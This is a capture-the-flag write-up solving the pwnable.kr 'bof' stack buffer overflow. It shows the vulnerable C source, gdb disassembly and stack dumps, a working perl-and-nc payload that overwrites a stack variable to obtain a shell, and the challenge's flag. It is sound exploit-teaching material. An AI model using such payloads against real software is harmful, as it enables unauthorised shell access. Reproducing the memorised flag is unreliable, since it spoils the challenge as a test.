First I downloaded the files bof and bof.c
In order to figure out what we are dealing with I looked at buf.c

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}

Looks like we have a 32 byte character array that we are gonna overflow! Fun!
Usually for buffer overflow attacks I use gdb so lets try it.

gdb bof
GNU gdb (Ubuntu 7.10-1ubuntu2) 7.10
Copyright (C) 2015 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from bof...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/nick/pwnable.kr/bof 
overflow me : 
aasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdf
Nah..
*** stack smashing detected ***: /home/nick/pwnable.kr/bof terminated

Program received signal SIGABRT, Aborted.
0xf7fd9ba0 in __kernel_vsyscall ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/nick/pwnable.kr/bof 
overflow me : 
a
Nah..
[Inferior 1 (process 8033) exited normally]
(gdb) disass main
Dump of assembler code for function main:
   0x5655568a <+0>:	push   %ebp
   0x5655568b <+1>:	mov    %esp,%ebp
   0x5655568d <+3>:	and    $0xfffffff0,%esp
   0x56555690 <+6>:	sub    $0x10,%esp
   0x56555693 <+9>:	movl   $0xdeadbeef,(%esp)
   0x5655569a <+16>:	call   0x5655562c <func>
   0x5655569f <+21>:	mov    $0x0,%eax
   0x565556a4 <+26>:	leave  
   0x565556a5 <+27>:	ret    
End of assembler dump.
(gdb) disass func
Dump of assembler code for function func:
   0x5655562c <+0>:	push   %ebp
   0x5655562d <+1>:	mov    %esp,%ebp
   0x5655562f <+3>:	sub    $0x48,%esp
   0x56555632 <+6>:	mov    %gs:0x14,%eax
   0x56555638 <+12>:	mov    %eax,-0xc(%ebp)
   0x5655563b <+15>:	xor    %eax,%eax
   0x5655563d <+17>:	movl   $0x78c,(%esp)
   0x56555644 <+24>:	call   0x56555645 <func+25>
   0x56555649 <+29>:	lea    -0x2c(%ebp),%eax
   0x5655564c <+32>:	mov    %eax,(%esp)
   0x5655564f <+35>:	call   0x56555650 <func+36>
   0x56555654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x5655565b <+47>:	jne    0x5655566b <func+63>
   0x5655565d <+49>:	movl   $0x79b,(%esp)
   0x56555664 <+56>:	call   0x56555665 <func+57>
   0x56555669 <+61>:	jmp    0x56555677 <func+75>
   0x5655566b <+63>:	movl   $0x7a3,(%esp)
   0x56555672 <+70>:	call   0x56555673 <func+71>
   0x56555677 <+75>:	mov    -0xc(%ebp),%eax
   0x5655567a <+78>:	xor    %gs:0x14,%eax
   0x56555681 <+85>:	je     0x56555688 <func+92>
   0x56555683 <+87>:	call   0x56555684 <func+88>
   0x56555688 <+92>:	leave  
   0x56555689 <+93>:	ret    
End of assembler dump.
(gdb) b *0x56555654
Breakpoint 1 at 0x56555654
(gdb) run
Starting program: /home/nick/pwnable.kr/bof 
overflow me : 
asdf

Breakpoint 1, 0x56555654 in func ()
(gdb) x/100x $esp
0xffffd0e0:	0xffffd0fc	0xffffd184	0x00000001	0x00f0b5ff
0xffffd0f0:	0xffffffff	0x00c10000	0xf7e0ec34	0x66647361
0xffffd100:	0x56556f00	0x00000000	0x00000001	0x5655549d
0xffffd110:	0x00000003	0x00008000	0x56556ff4	0x9c936100
0xffffd120:	0x00000001	0x56555530	0xffffd148	0x5655569f
0xffffd130:	0xdeadbeef	0xf7ffd000	0x565556b9	0xf7fb9000
0xffffd140:	0x00000000	0x56555530	0x00000000	0xf7e1a72e
0xffffd150:	0x00000001	0xffffd1e4	0xffffd1ec	0x00000000
0xffffd160:	0x00000000	0x00000000	0xf7fef079	0x565552c0
0xffffd170:	0x56557018	0xf7fb9000	0x00000000	0x56555530
0xffffd180:	0x00000000	0xc390d653	0xff7f9243	0x00000000
0xffffd190:	0x00000000	0x00000000	0x00000001	0x56555530
0xffffd1a0:	0x00000000	0xf7fee790	0xf7e1a659	0x56556ff4
0xffffd1b0:	0x00000001	0x56555530	0x00000000	0x56555561
0xffffd1c0:	0x5655568a	0x00000001	0xffffd1e4	0x565556b0
0xffffd1d0:	0x56555720	0xf7fe9210	0xffffd1dc	0xf7ffd938
0xffffd1e0:	0x00000001	0xffffd3a8	0x00000000	0xffffd3c2
0xffffd1f0:	0xffffd3cd	0xffffd3df	0xffffd40f	0xffffd425
0xffffd200:	0xffffd436	0xffffd446	0xffffd45a	0xffffd46c
0xffffd210:	0xffffd483	0xffffd4c7	0xffffd4e4	0xffffd4ee
0xffffd220:	0xffffda87	0xffffdac1	0xffffdaf5	0xffffdb1e
0xffffd230:	0xffffdb51	0xffffdb5d	0xffffdba1	0xffffdbb8
0xffffd240:	0xffffdc16	0xffffdc25	0xffffdc46	0xffffdc58
0xffffd250:	0xffffdc6a	0xffffdc7f	0xffffdc99	0xffffdcad
0xffffd260:	0xffffdcbe	0xffffdcd1	0xffffdd07	0xffffdd16


After some trial and error I was able to overwrite the compared variable with a buffer overflow.

(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/nick/pwnable.kr/bof 
overflow me : 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Breakpoint 1, 0x56555654 in func ()
(gdb) x/100x $esp
0xffffd0e0:	0xffffd0fc	0xffffd184	0x00000001	0x00f0b5ff
0xffffd0f0:	0xffffffff	0x00c10000	0xf7e0ec34	0x41414141
0xffffd100:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd110:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd120:	0x41414141	0x41414141	0x41414141	0x41414141
0xffffd130:	0x42424242	0xf7ffd000	0x565556b9	0xf7fb9000
0xffffd140:	0x00000000	0x56555530	0x00000000	0xf7e1a72e
0xffffd150:	0x00000001	0xffffd1e4	0xffffd1ec	0x00000000
0xffffd160:	0x00000000	0x00000000	0xf7fef079	0x565552c0
0xffffd170:	0x56557018	0xf7fb9000	0x00000000	0x56555530
0xffffd180:	0x00000000	0x1ca7fdfd	0x2048b9ed	0x00000000
0xffffd190:	0x00000000	0x00000000	0x00000001	0x56555530
0xffffd1a0:	0x00000000	0xf7fee790	0xf7e1a659	0x56556ff4
0xffffd1b0:	0x00000001	0x56555530	0x00000000	0x56555561
0xffffd1c0:	0x5655568a	0x00000001	0xffffd1e4	0x565556b0
0xffffd1d0:	0x56555720	0xf7fe9210	0xffffd1dc	0xf7ffd938
0xffffd1e0:	0x00000001	0xffffd3a8	0x00000000	0xffffd3c2
0xffffd1f0:	0xffffd3cd	0xffffd3df	0xffffd40f	0xffffd425
0xffffd200:	0xffffd436	0xffffd446	0xffffd45a	0xffffd46c
0xffffd210:	0xffffd483	0xffffd4c7	0xffffd4e4	0xffffd4ee
0xffffd220:	0xffffda87	0xffffdac1	0xffffdaf5	0xffffdb1e
0xffffd230:	0xffffdb51	0xffffdb5d	0xffffdba1	0xffffdbb8
0xffffd240:	0xffffdc16	0xffffdc25	0xffffdc46	0xffffdc58
0xffffd250:	0xffffdc6a	0xffffdc7f	0xffffdc99	0xffffdcad
0xffffd260:	0xffffdcbe	0xffffdcd1	0xffffdd07	0xffffdd16


so now all I have to do is fill it with the correct hexadecimal and then exploit the vulnerability

(perl -e 'print "A"x52 . "\xbe\xba\xfe\xca"';cat ) | nc pwnable.kr 9000

We Then gain access to the command prompt and can merely open the flag file

vi flag

There we find out that flag="daddy, I just pwned a buFFer :)"

